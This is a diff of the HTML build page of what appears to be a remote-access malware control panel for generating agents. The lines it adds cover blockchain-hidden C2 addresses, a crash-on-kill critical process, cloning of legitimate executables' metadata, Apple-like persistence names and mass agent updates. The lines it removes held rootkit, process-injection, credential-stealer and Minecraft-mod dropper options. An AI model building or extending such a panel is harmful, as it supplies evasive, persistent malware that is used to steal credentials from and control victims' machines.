@@ -19,13 +19,14 @@
     />
     <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
     <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
     <script
       src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.2/anime.min.js"
       crossorigin="anonymous"
       referrerpolicy="no-referrer"
     ></script>
-    <script src="/assets/toast.js"></script>
-    <script src="/assets/ripple.js"></script>
+    <script defer src="/assets/toast.js"></script>
+    <script defer src="/assets/ripple.js"></script>
     <style>
       .accordion-body {
         display: grid;
@@ -158,6 +159,25 @@
                       <p class="text-xs text-slate-500 mt-1">
                         When enabled, the URL above must be a raw HTTPS link with one wss:// endpoint per line.
                       </p>
+                      <label class="mt-2 flex items-center gap-2 text-xs text-slate-400">
+                        <input type="checkbox" id="sol-memo" name="sol-memo" class="w-4 h-4" />
+                        Use Solana memo lookup (resolve server from blockchain)
+                      </label>
+                      <div id="sol-settings" class="hidden mt-2 flex flex-col gap-2 pl-6 border-l-2 border-purple-800/50">
+                        <div>
+                          <label class="block text-xs font-medium text-slate-400 mb-1" for="sol-address">Solana Address (Base58)</label>
+                          <input type="text" id="sol-address" name="sol-address" placeholder="YourSolanaWalletAddressHere..."
+                            class="w-full px-2 py-1.5 bg-slate-800/60 border border-slate-700 rounded text-sm focus:outline-none focus:border-purple-500 transition-colors font-mono" />
+                        </div>
+                        <div>
+                          <label class="block text-xs font-medium text-slate-400 mb-1" for="sol-rpc-endpoints">RPC Endpoints (one per line)</label>
+                          <textarea id="sol-rpc-endpoints" name="sol-rpc-endpoints" rows="4" placeholder="https://api.mainnet-beta.solana.com&#10;https://solana-rpc.publicnode.com"
+                            class="w-full px-2 py-1.5 bg-slate-800/60 border border-slate-700 rounded text-xs focus:outline-none focus:border-purple-500 transition-colors font-mono"></textarea>
+                        </div>
+                        <p class="text-xs text-slate-500">
+                          Client will query these endpoints to find the encrypted server URL from the Solana address's memo transactions.
+                        </p>
+                      </div>
                     </div>
 
                     <div>
@@ -203,7 +223,7 @@
                     </label>
 
                     <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-400 transition-colors">
-                      <input type="checkbox" name="disable-cgo" class="w-4 h-4" checked />
+                      <input type="checkbox" name="disable-cgo" class="w-4 h-4" />
                       <span class="flex items-center gap-2">
                         <i class="fa-solid fa-ban text-emerald-400"></i> Disable CGO
                       </span>
@@ -253,7 +273,7 @@
                     </div>
 
                     <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-cyan-500 transition-colors">
-                      <input type="checkbox" name="enable-upx" class="w-4 h-4" checked />
+                      <input type="checkbox" name="enable-upx" class="w-4 h-4" />
                       <div class="flex flex-col">
                         <span class="flex items-center gap-2">
                           <i class="fa-solid fa-compress text-cyan-400"></i> UPX Compression
@@ -272,140 +292,6 @@
                       </label>
                     </div>
 
-                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-red-500 transition-colors">
-                      <input type="checkbox" name="enable-donut" class="w-4 h-4" />
-                      <div class="flex flex-col">
-                        <span class="flex items-center gap-2">
-                          <i class="fa-solid fa-circle-dot text-red-400"></i> Donut Shellcode
-                        </span>
-                        <span class="text-xs text-slate-500">Convert Windows PE to position-independent shellcode (.bin) — requires Donut on server, x86/x64 only</span>
-                      </div>
-                    </label>
-
-                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
-                      <input type="checkbox" name="enable-typhon" class="w-4 h-4" />
-                      <div class="flex flex-col">
-                        <span class="flex items-center gap-2">
-                          <i class="fa-solid fa-syringe text-amber-400"></i> Typhon Injection Loader
-                        </span>
-                        <span class="text-xs text-slate-500">Wrap shellcode in a standalone PoolParty process injector — x64 Windows only, auto-enables Donut</span>
-                      </div>
-                    </label>
-
-                    <div id="typhon-settings-container" class="hidden pl-3 border-l-2 border-amber-500/40 flex flex-col gap-3">
-                      <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1" for="typhon-variant">Injection Variant</label>
-                        <select id="typhon-variant" name="typhon-variant"
-                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-amber-500 transition-colors">
-                          <option value="1" selected>V1 — Worker Factory (recommended)</option>
-                          <option value="2">V2 — I/O Completion Callback</option>
-                          <option value="3">V3 — Timer Callback</option>
-                          <option value="4">V4 — ALPC Callback</option>
-                          <option value="5">V5 — Job Notification</option>
-                          <option value="6">V6 — Direct Callback</option>
-                          <option value="7">V7 — Wait Callback</option>
-                          <option value="8">V8 — Timer (delayed execution)</option>
-                          <option value="all">All Variants</option>
-                          <option value="safe">Safe Variants (CFG/XFG compatible)</option>
-                          <option value="rec">Recommended (auto-select)</option>
-                        </select>
-                        <p class="text-xs text-slate-500 mt-1">PoolParty thread pool injection variant. V1 bypasses CFG/XFG and is recommended for most targets.</p>
-                      </div>
-                      <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1" for="typhon-process">Target Process</label>
-                        <select id="typhon-process" name="typhon-process"
-                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-amber-500 transition-colors">
-                          <option value="">Auto (Typhon default)</option>
-                          <option value="notepad.exe">notepad.exe</option>
-                          <option value="conhost.exe">conhost.exe</option>
-                          <option value="explorer.exe">explorer.exe</option>
-                          <option value="svchost.exe">svchost.exe</option>
-                          <option value="dllhost.exe">dllhost.exe</option>
-                          <option value="cmd.exe">cmd.exe</option>
-                          <option value="powershell.exe">powershell.exe</option>
-                          <option value="msiexec.exe">msiexec.exe</option>
-                          <option value="werfault.exe">werfault.exe</option>
-                          <option value="runtimebroker.exe">RuntimeBroker.exe</option>
-                          <option value="searchhost.exe">SearchHost.exe</option>
-                        </select>
-                        <p class="text-xs text-slate-500 mt-1">Process to inject shellcode into. Leave auto unless you need a specific target.</p>
-                      </div>
-                    </div>
-
-                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-violet-500 transition-colors">
-                      <input type="checkbox" name="enable-vault" class="w-4 h-4" />
-                      <div class="flex flex-col">
-                        <span class="flex items-center gap-2">
-                          <i class="fa-solid fa-lock text-violet-400"></i> Vault Encryption
-                        </span>
-                        <span class="text-xs text-slate-500">Encrypt all outputs with post-quantum hybrid crypto (X25519 + ML-KEM-768) — requires Rust/cargo or vault binary on server</span>
-                      </div>
-                    </label>
-
-                    <div id="vault-settings-container" class="hidden pl-3 border-l-2 border-violet-500/40 flex flex-col gap-2">
-                      <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1" for="vault-recipient">Recipient Public Key <span class="text-slate-500 font-normal">(optional)</span></label>
-                        <textarea id="vault-recipient" name="vault-recipient" rows="2" placeholder="Leave blank to use auto-generated server keypair"
-                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm font-mono focus:outline-none focus:border-violet-500 transition-colors resize-none"></textarea>
-                        <p class="text-xs text-slate-500 mt-1">Public key from <code>vault keygen</code>. If blank, the server auto-generates a keypair and stores the private key at <code>data/tools/vault-operator-key</code>.</p>
-                      </div>
-                    </div>
-
-                    <!-- r77 Rootkit -->
-                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-rose-500 transition-colors">
-                      <input type="checkbox" name="enable-r77" class="w-4 h-4" />
-                      <div class="flex flex-col">
-                        <span class="flex items-center gap-2">
-                          <i class="fa-solid fa-ghost text-rose-400"></i> r77 Rootkit
-                          <span class="text-xs bg-rose-900/50 text-rose-300 px-1.5 py-0.5 rounded">Ring 3</span>
-                        </span>
-                        <span class="text-xs text-slate-500">Fileless user-mode rootkit — hides files, processes, registry keys, network connections; AMSI bypass + EDR unhooking (bytecode77/r77-rootkit)</span>
-                      </div>
-                    </label>
-
-                    <!-- Chaos Rootkit -->
-                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-red-600 transition-colors">
-                      <input type="checkbox" name="enable-chaos" class="w-4 h-4" />
-                      <div class="flex flex-col">
-                        <span class="flex items-center gap-2">
-                          <i class="fa-solid fa-skull text-red-500"></i> Chaos Rootkit
-                          <span class="text-xs bg-red-900/50 text-red-300 px-1.5 py-0.5 rounded">Ring 0</span>
-                          <span class="text-xs bg-red-900/50 text-red-300 px-1.5 py-0.5 rounded">Ring 3</span>
-                        </span>
-                        <span class="text-xs text-slate-500">Kernel-mode driver (DKOM process hiding, privilege escalation, file protection) + ring-3 GUI/console controller (ZeroMemoryEx/Chaos-Rootkit)</span>
-                      </div>
-                    </label>
-
-                    <div id="chaos-settings-container" class="hidden pl-3 border-l-2 border-red-600/40">
-                      <label class="block text-xs font-medium text-slate-400 mb-2">Components to include</label>
-                      <div class="flex flex-col gap-1.5">
-                        <label class="flex items-center gap-2 text-sm cursor-pointer">
-                          <input type="radio" name="chaos-mode" value="both" checked class="w-3.5 h-3.5" />
-                          <span>Both — ring0 kernel driver <span class="text-slate-500">+</span> ring3 controller</span>
-                        </label>
-                        <label class="flex items-center gap-2 text-sm cursor-pointer">
-                          <input type="radio" name="chaos-mode" value="ring0" class="w-3.5 h-3.5" />
-                          <span>Ring 0 only — <code class="text-red-300">Chaos-Rootkit.sys</code> kernel driver</span>
-                        </label>
-                        <label class="flex items-center gap-2 text-sm cursor-pointer">
-                          <input type="radio" name="chaos-mode" value="ring3" class="w-3.5 h-3.5" />
-                          <span>Ring 3 only — <code class="text-red-300">ring3-console.exe</code> + <code class="text-red-300">ring3-gui.exe</code></span>
-                        </label>
-                      </div>
-                    </div>
-
-                    <!-- Standalone Stealer Binary -->
-                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-violet-500 transition-colors">
-                      <input type="checkbox" name="enable-stealer" class="w-4 h-4" />
-                      <div class="flex flex-col">
-                        <span class="flex items-center gap-2">
-                          <i class="fa-solid fa-key text-violet-400"></i> Standalone Stealer
-                          <span class="text-xs bg-violet-900/50 text-violet-300 px-1.5 py-0.5 rounded">Windows</span>
-                        </span>
-                        <span class="text-xs text-slate-500">Builds a separate <code>stealer-windows-amd64.exe</code> that extracts browser passwords &amp; Discord tokens and POSTs them to the C2 via <code>/api/steal-drop</code></span>
-                      </div>
-                    </label>
-
                     <div class="flex flex-col gap-1">
                       <label class="block text-xs font-medium text-slate-400 mb-1" for="sleep-seconds">
                         <i class="fa-solid fa-hourglass-half text-yellow-400"></i> Startup Sleep (seconds)
@@ -414,16 +300,6 @@
                         min="0" max="3600" step="1"
                         class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-yellow-500 transition-colors" />
                       <p class="text-xs text-slate-500">Sleep N seconds before connecting (anti-sandbox). Set to 0 to disable.</p>
-                    </div>
-
-                    <div class="flex flex-col gap-1">
-                      <label class="block text-xs font-medium text-slate-400 mb-1" for="jitter-percent">
-                        <i class="fa-solid fa-shuffle text-cyan-400"></i> Beacon Jitter (%)
-                      </label>
-                      <input type="number" id="jitter-percent" name="jitter-percent" value="20"
-                        min="0" max="50" step="1"
-                        class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-cyan-500 transition-colors" />
-                      <p class="text-xs text-slate-500">Randomize ping interval ±N% to prevent pattern-based detection. 0 = fixed interval.</p>
                     </div>
 
                   </div>
@@ -493,16 +369,6 @@
                             </div>
                           </label>
                         </div>
-                        <div class="mt-3">
-                          <div class="text-xs font-semibold text-slate-300 mb-2 flex items-center gap-2">
-                            <i class="fa-solid fa-file-signature text-blue-400"></i> Startup File Name
-                          </div>
-                          <input type="text" id="startup-name" name="startup-name" maxlength="32"
-                            pattern="[A-Za-z0-9_-]+"
-                            placeholder="ovd (default)"
-                            class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-orange-500 transition-colors placeholder:text-slate-600" />
-                          <p class="text-xs text-slate-500 mt-1">Custom executable name used by all selected methods (e.g. <code>svchost</code> → <code>svchost.exe</code>). Leave blank for default randomized name.</p>
-                        </div>
                       </div>
 
                       <div id="persistence-linux-settings" class="hidden" data-persistence-os="linux">
@@ -519,8 +385,20 @@
                           <i class="fa-brands fa-apple text-slate-200"></i> macOS Persistence
                         </div>
                         <p class="text-xs text-slate-500">
-                          Uses <code>LaunchAgents</code> (<code>com.overlord.agent.plist</code>) for login persistence.
+                          Uses <code>LaunchAgents</code> for login persistence. The startup name is used as the plist label and <strong class="text-orange-400">must start with <code>com.</code></strong> (e.g. <code>com.apple.updater</code>).
                         </p>
+                      </div>
+
+                      <div id="persistence-startup-name-container" class="hidden">
+                        <div class="text-xs font-semibold text-slate-300 mb-2 flex items-center gap-2">
+                          <i class="fa-solid fa-file-signature text-blue-400"></i> Startup File Name
+                        </div>
+                        <input type="text" id="startup-name" name="startup-name" maxlength="32"
+                          pattern="[A-Za-z0-9_.-]+"
+                          placeholder="ovd (default)"
+                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-orange-500 transition-colors placeholder:text-slate-600" />
+                        <p class="text-xs text-slate-500 mt-1">Custom name for the installed executable. On Windows: used as filename (<code>svchost</code> → <code>svchost.exe</code>). On macOS: also used as the LaunchAgent label — <span id="startup-name-macos-hint" class="hidden text-orange-400 font-medium">must start with <code>com.</code> (e.g. <code>com.apple.updater</code>).</span><span id="startup-name-default-hint">Leave blank for a default randomized name.</span></p>
+                        <p id="startup-name-error" class="hidden text-xs text-red-400 mt-1 font-medium"></p>
                       </div>
                     </div>
 
@@ -560,6 +438,31 @@
                         <span class="text-xs text-slate-500">Embeds a manifest requesting UAC elevation on launch</span>
                       </div>
                     </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-red-500 transition-colors">
+                      <input type="checkbox" name="critical-process" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-skull text-red-400"></i> Critical Process
+                        </span>
+                        <span class="text-xs text-slate-500">If running as admin, marks the process as critical — killing it without disconnect/uninstall triggers a BSOD</span>
+                      </div>
+                    </label>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2 flex items-center gap-2">
+                        <i class="fa-solid fa-clone text-cyan-400"></i> Clone Metadata from File
+                        <span class="text-xs text-slate-500 font-normal">Copies metadata &amp; icon from an existing PE</span>
+                      </label>
+                      <div class="flex items-center gap-3 flex-wrap">
+                        <label class="flex items-center gap-2 px-4 py-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-cyan-500 transition-colors text-sm">
+                          <i class="fa-solid fa-file-import text-cyan-400"></i>
+                          <span id="clone-exe-label">Choose .exe / .dll file</span>
+                          <input type="file" id="clone-exe-upload" accept=".exe,.dll,.scr,.sys,.ocx" class="hidden" />
+                        </label>
+                        <span id="clone-exe-status" class="text-xs hidden"></span>
+                      </div>
+                    </div>
 
                     <div>
                       <label class="block text-sm font-medium text-slate-300 mb-2 flex items-center gap-2">
@@ -607,62 +510,7 @@
                         <option value=".cmd">.cmd — Command Script</option>
                         <option value=".pif">.pif — Program Info File</option>
                         <option value=".com">.com — MS-DOS Application</option>
-                        <option value=".bin">.bin — Donut Shellcode</option>
-                        <option value=".jar">.jar — Minecraft JAR Dropper</option>
                       </select>
-                    </div>
-
-                    <!-- JAR dropper settings (shown when .jar output type is selected) -->
-                    <div id="jar-settings-container" class="hidden pl-3 border-l-2 border-green-500/40 flex flex-col gap-2">
-                      <p class="text-xs text-slate-400 flex items-center gap-1.5">
-                        <i class="fa-brands fa-java text-green-400"></i>
-                        Bundles windows-amd64 shellcode into a Fabric mod .jar — drops and executes via PowerShell on launch (requires JDK on server)
-                      </p>
-                      <div class="grid grid-cols-2 gap-2">
-                        <div>
-                          <label class="block text-xs font-medium text-slate-400 mb-1" for="jar-mc-version">MC Version</label>
-                          <select id="jar-mc-version" name="jar-mc-version"
-                            class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-green-500 transition-colors">
-                            <option value="1.21.11">1.21.11</option>
-                            <option value="1.21.10">1.21.10</option>
-                            <option value="1.21.9">1.21.9</option>
-                            <option value="1.21.8">1.21.8</option>
-                            <option value="1.21.7">1.21.7</option>
-                            <option value="1.21.6">1.21.6</option>
-                            <option value="1.21.5">1.21.5</option>
-                            <option value="1.21.4" selected>1.21.4</option>
-                            <option value="1.21.3">1.21.3</option>
-                            <option value="1.21.2">1.21.2</option>
-                            <option value="1.21.1">1.21.1</option>
-                            <option value="1.21">1.21</option>
-                          </select>
-                        </div>
-                        <div>
-                          <label class="block text-xs font-medium text-slate-400 mb-1" for="jar-mod-id">Mod ID</label>
-                          <input type="text" id="jar-mod-id" name="jar-mod-id" maxlength="32"
-                            pattern="[a-z0-9_]+" placeholder="mcmod"
-                            class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-green-500 transition-colors placeholder:text-slate-600" />
-                        </div>
-                      </div>
-                      <div>
-                        <label class="block text-xs font-medium text-slate-400 mb-1" for="jar-mod-name">Display Name</label>
-                        <input type="text" id="jar-mod-name" name="jar-mod-name" maxlength="64"
-                          placeholder="Minecraft Mod"
-                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-green-500 transition-colors placeholder:text-slate-600" />
-                      </div>
-
-                      <!-- JAR Mod Binder -->
-                      <div class="border-t border-slate-700/60 pt-2 mt-1">
-                        <label class="block text-xs font-medium text-slate-400 mb-1">
-                          Bind JAR Mods
-                          <span class="text-slate-600 font-normal ml-1">merge up to 3 mods into output .jar</span>
-                        </label>
-                        <div id="jar-bound-mods-list" class="flex flex-col gap-1 mb-2"></div>
-                        <label id="jar-bind-add-label" class="flex items-center justify-center gap-2 px-3 py-1.5 rounded-lg border border-dashed border-slate-600 cursor-pointer hover:border-green-500 transition-colors text-xs text-slate-400 hover:text-green-400">
-                          <i class="fa-solid fa-plus"></i> Add JAR Mod
-                          <input type="file" id="jar-bind-file-input" class="hidden" accept=".jar" />
-                        </label>
-                      </div>
                     </div>
 
                   </div>
@@ -684,7 +532,7 @@
 
                     <p class="text-xs text-slate-400">
                       Files are embedded inside the agent binary and written to a temp directory when the agent starts.
-                      Up to 5 files, 10 MB each. Files set to <em>Execute</em> are launched immediately after being dropped.
+                      Up to 5 files, 50 MB each. Files set to <em>Execute</em> are launched immediately after being dropped.
                     </p>
 
                     <!-- macOS Gatekeeper note -->
@@ -711,11 +559,19 @@
               </div>
 
               <!-- Build Button -->
-              <button type="submit" id="build-btn"
-                class="flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
-                <i class="fa-solid fa-hammer"></i>
-                <span>Start Build</span>
-              </button>
+              <div class="flex gap-2">
+                <button type="submit" id="build-btn"
+                  class="flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  <i class="fa-solid fa-hammer"></i>
+                  <span>Start Build</span>
+                </button>
+
+                <button type="button" id="build-update-all-btn"
+                  class="flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-amber-600 hover:bg-amber-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  <i class="fa-solid fa-arrow-up-from-bracket"></i>
+                  <span>Build &amp; Update All</span>
+                </button>
+              </div>
             </form>
           </div>
 
@@ -749,6 +605,32 @@
         </div>
       </div>
     </main>
+
+    <!-- Build & Update All Confirmation Modal -->
+    <div id="update-all-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/60 backdrop-blur-sm">
+      <div class="bg-slate-900 border border-slate-700 rounded-xl shadow-2xl max-w-md w-full mx-4 p-6">
+        <div class="flex items-center gap-3 mb-4">
+          <div class="w-10 h-10 rounded-full bg-amber-900/50 border border-amber-700 flex items-center justify-center">
+            <i class="fa-solid fa-arrow-up-from-bracket text-amber-400"></i>
+          </div>
+          <h3 class="text-lg font-semibold text-white">Build &amp; Update All Clients</h3>
+        </div>
+        <div id="update-all-modal-body" class="text-slate-300 text-sm mb-6 space-y-2">
+          <p>Checking eligible clients...</p>
+        </div>
+        <div class="flex items-center justify-end gap-3">
+          <button id="update-all-cancel" type="button"
+            class="px-4 py-2 rounded-lg border border-slate-600 text-slate-300 hover:bg-slate-800 transition-colors text-sm font-medium">
+            Cancel
+          </button>
+          <button id="update-all-confirm" type="button"
+            class="px-4 py-2 rounded-lg bg-amber-600 hover:bg-amber-700 text-white transition-colors text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed">
+            <i class="fa-solid fa-hammer mr-1"></i> Build &amp; Update
+          </button>
+        </div>
+      </div>
+    </div>
+
     <script type="module" src="/assets/nav.js"></script>
     <script type="module" src="/assets/build.js"></script>
   </body>
